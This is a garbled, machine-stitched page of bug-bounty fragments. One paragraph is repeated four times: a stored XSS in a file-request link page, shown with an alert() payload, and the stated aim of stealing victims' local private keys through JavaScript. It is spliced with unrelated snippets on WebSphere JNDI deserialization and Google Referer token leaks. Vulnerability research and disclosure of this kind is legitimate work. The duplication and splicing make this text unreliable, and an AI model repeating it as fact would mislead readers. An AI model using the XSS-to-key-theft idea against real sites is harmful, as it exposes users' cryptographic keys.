The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

When it was confirmed that it was impossible to make an article on historical vulnerabilities, we had to start from readObject ReadExternal, toString, compare and other functions tried to find a place where JNDI can be injected in a readObject. However, due to the high version of the sdk, the only way to use it is local factory or jndi local deserialization. However, WebSphere's open utilization chain is blocked, and local deserialization has no effect here, So the only thing left is the local factory

Hello, everyone. Today I want to share a simple vulnerability about Google. The reason for this vulnerability is that when a web page request occurs on the Google server, the HTTP Referer header discloses user privacy and token information. Follow the example, I found that the vulnerability exists on four Google servers, and finally received a reward of $4633.7
Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript

Hello, everyone. Today I want to share a simple vulnerability about Google.

Vulnerability 1 was inspired one day after reading a Google XSS vulnerability analysis article written by others after class. It tells about an XSS vulnerability in Google Colab. You can read it here
The problem here is that in the link page generated by this file request, the user name or company name field is not filtered, and XSS Payload triggering can be realized. If XSS Payload<script>alert ('Hi there! ') is added to it</ script>, After the corresponding file request link is sent to other users, XSS will be executed when the link is opened, as follows: that is, we can execute arbitrary code and do some bad things in the target user's system, but how can we use it in depth? Obtain the local private key information of the target user. The encryption service uses client asymmetric encryption to protect user files. Since the encryption service is deployed in the form of a website, its encryption mechanism should be called through JavaScript, that is, the local private key information can be obtained through JavaScript
